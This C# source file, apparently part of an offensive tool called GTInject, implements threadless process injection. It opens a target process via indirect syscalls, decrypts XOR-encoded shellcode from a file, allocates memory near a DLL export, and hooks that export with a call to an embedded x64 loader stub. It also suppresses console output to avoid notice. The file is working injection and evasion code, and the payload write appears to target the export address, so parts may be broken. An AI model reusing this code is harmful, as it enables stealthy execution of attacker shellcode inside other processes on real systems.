using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using static GTInject.SysCalls.WinNative;
using GTInject.SysCalls;
using System.Threading;

namespace GTInject.Novel
{
    internal class ThreadlessInject
    {
        public static void Inject(int remoteProcessID, string dll, string export, string binLocation, string bytePath, string xorkey)
        {
            var hModule = GetModuleHandle(dll);

            if (hModule == IntPtr.Zero)
                hModule = LoadLibrary(dll);

            if (hModule == IntPtr.Zero)
            {
                Console.WriteLine($"[!] Failed to open handle to DLL {dll}, is the KnownDll loaded?");
                return;
            }


            var exportAddress = GetProcAddress(hModule, export);
            if (exportAddress == IntPtr.Zero)
            {
                Console.WriteLine($"[!] Failed to find export {export} in {dll}, are you sure it's correct?");
                return;
            }

            Console.WriteLine($"[=] Found {dll}!{export} @ 0x{exportAddress.ToInt64():x}");

            Process rProc = Process.GetProcessById(remoteProcessID);
            int pid = rProc.Id;
            var hProcess = IntPtr.Zero;
            // set up the syscall for NtOpenProcess
            WinNative.CLIENT_ID cID = new WinNative.CLIENT_ID();
            cID.UniqueProcess = (IntPtr)(UInt32)pid;
            WinNative.OBJECT_ATTRIBUTES oAttr = new WinNative.OBJECT_ATTRIBUTES();
            var status = Syscalls.IndirectSysclNtOpenProcess(ref hProcess, 0x001F0FFF, ref oAttr, ref cID);


            if ( hProcess == IntPtr.Zero)
            {
                Console.WriteLine($"[!] Failed to open PID {remoteProcessID}: .");
                return;
            }

            var shellcode = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);

            // backup the previous output handler connected to Console
            TextWriter backupOut = Console.Out;

            // activate a null handle
            Console.SetOut(TextWriter.Null);

            var loaderAddress = FindMemoryHole(
            hProcess,
            (ulong)exportAddress,
            ShellcodeLoader.Length + shellcode.Length);

            // restore the previous handle
            Console.SetOut(backupOut);

            if (loaderAddress == 0)
            {
                Console.WriteLine("[!] Failed to find a memory hole with 2G of export address, bailing");
                return;
            }

            Console.WriteLine($"[=] Allocated loader and shellcode at 0x{loaderAddress:x} within PID {pid}");

            var originalBytes = Marshal.ReadInt64(exportAddress);
            GenerateHook(originalBytes);

            var vProtRegionSize = new IntPtr(8);
            uint oldProtect = 0;
            Syscalls.IndirectSysclNtProtectVirtualMemory(hProcess, ref exportAddress, ref vProtRegionSize, (uint)(MemoryProtection.ExecuteReadWrite), ref oldProtect);
            //ProtectVirtualMemory( hProcess, exportAddress, 8, MemoryProtection.ExecuteReadWrite, out var oldProtect);

            var relativeLoaderAddress = (int)(loaderAddress - ((ulong)exportAddress + 5));
            var callOpCode = new byte[] { 0xe8, 0, 0, 0, 0 };

            var ms = new MemoryStream(callOpCode);
            var br = new BinaryWriter(ms);
            br.Seek(1, SeekOrigin.Begin);
            br.Write(relativeLoaderAddress);

            var buffer = Marshal.AllocHGlobal(callOpCode.Length);
            Marshal.Copy(callOpCode, 0, buffer, callOpCode.Length);
            uint bytesWritten = 0;
            status = Syscalls.IndirectSysclNtWriteVirtualMemory( hProcess, exportAddress, buffer, (uint)callOpCode.Length, ref bytesWritten);

            if (status != NTSTATUS.Success || (int)bytesWritten != callOpCode.Length)
            {
                Console.WriteLine($"[!] Failed to write callOpCode: {status}");
                return;
            }
            Marshal.FreeHGlobal(buffer);

            var payload = ShellcodeLoader.Concat(shellcode).ToArray();
            var ldraddr = (IntPtr)loaderAddress;
            vProtRegionSize = (IntPtr)payload.Length;
            status = Syscalls.IndirectSysclNtProtectVirtualMemory(hProcess, ref ldraddr, ref vProtRegionSize, (uint)(MemoryProtection.ReadWrite), ref oldProtect);

            if (status != NTSTATUS.Success)
            {
                Console.WriteLine($"[!] Failed to unprotect 0x{loaderAddress:x}");
                return;
            }

            buffer = Marshal.AllocHGlobal(payload.Length);
            Marshal.Copy(payload, 0, buffer, payload.Length);
            bytesWritten = 0;
            status = Syscalls.IndirectSysclNtWriteVirtualMemory(hProcess, exportAddress, buffer, (uint)payload.Length, ref bytesWritten);
            if (status != NTSTATUS.Success || (int)bytesWritten != payload.Length)
            {
                Console.WriteLine($"[!] Failed to write payload: {status}");
                return;
            }
            Marshal.FreeHGlobal(buffer);

            status = Syscalls.IndirectSysclNtProtectVirtualMemory(hProcess, ref ldraddr, ref vProtRegionSize, oldProtect, ref oldProtect);
            if (status != NTSTATUS.Success)
            {
                Console.WriteLine($"[!] Failed to protect 0x{loaderAddress:x}");
                return;
            }

            var timer = new Stopwatch();
            timer.Start();
            var executed = false;

            Console.WriteLine("[+] Shellcode injected, Waiting 60s for the hook to be called");
            while (timer.Elapsed.TotalSeconds < 60)
            {
                var bytesToRead = 8;
                var buf = Marshal.AllocHGlobal(bytesToRead);
                var bytesRead = (uint)0;

                NtReadVirtualMemory(
                    hProcess,
                    exportAddress,
                    buf,
                    (uint)bytesToRead,
                    ref bytesRead);

                var temp = new byte[bytesRead];
                Marshal.Copy(buf, temp, 0, bytesToRead);
                var currentBytes = BitConverter.ToInt64(temp, 0);

                if (originalBytes == currentBytes)
                {
                    executed = true;
                    break;
                }

                Thread.Sleep(1000);
            }

            timer.Stop();

            if (executed)
            {
                vProtRegionSize = new IntPtr(8);

                Syscalls.IndirectSysclNtProtectVirtualMemory(hProcess, ref exportAddress, ref vProtRegionSize, oldProtect, ref oldProtect);
                var regionSize = (UIntPtr)0;
                var ldrAddr = (IntPtr)loaderAddress;
                NtFreeVirtualMemory(hProcess, ref ldrAddr, ref regionSize, AllocationType.Release);

                Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s, export restored");
            }
            else
            {
                Console.WriteLine("[!] Shellcode did not trigger within 60s, it may still execute but we are not cleaning up");
            }

            CloseHandle(hProcess);
        }



        //////////
        // Supporting functions from Threadless Inject
        //////////

        public static IntPtr LoadLibrary(string path)
        {
            var us = new UNICODE_STRING();
            RtlInitUnicodeString(ref us, path);

            var hModule = IntPtr.Zero;

            var status = LdrLoadDll(
                IntPtr.Zero,
                0,
                ref us,
                ref hModule);

            return hModule;

        }
        private static readonly byte[] ShellcodeLoader =
        {
            0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
            0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
            0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
            0xE0, 0x90
        };

        private static IntPtr GetModuleHandle(string dll)
        {
            var self = Process.GetCurrentProcess();

            foreach (ProcessModule module in self.Modules)
            {
                if (!module.ModuleName.Equals(dll, StringComparison.OrdinalIgnoreCase))
                    continue;

                return module.BaseAddress;
            }

            return IntPtr.Zero;
        }

        private static void GenerateHook(long originalInstructions)
        {
            var writer = new BinaryWriter(new MemoryStream(ShellcodeLoader));
            //Write the original 8 bytes that were in the original export prior to hooking
            writer.Seek(0x12, SeekOrigin.Begin);
            writer.Write(originalInstructions);
            writer.Flush();
        }

        private static ulong FindMemoryHole(IntPtr hProcess, ulong exportAddress, int size)
        {
            ulong remoteLoaderAddress;
            var foundMemory = false;

            for (remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
                 remoteLoaderAddress < exportAddress + 0x70000000;
                 remoteLoaderAddress += 0x10000)
            {
                //var status = AllocateVirtualMemory(hProcess, remoteLoaderAddress, size);
                var baseAddr = (IntPtr)remoteLoaderAddress;
                var regionSize = (IntPtr)size;
                var status = Syscalls.IndirectSysclNtAllocateVirtualMemory(hProcess, ref baseAddr, IntPtr.Zero, ref regionSize, (uint)(AllocationType.Commit|AllocationType.Reserve), (uint)(MemoryProtection.ExecuteRead));
                if (status != NTSTATUS.Success)
                    continue;

                foundMemory = true;
                break;
            }

            return foundMemory ? remoteLoaderAddress : 0;

        }




    }
}
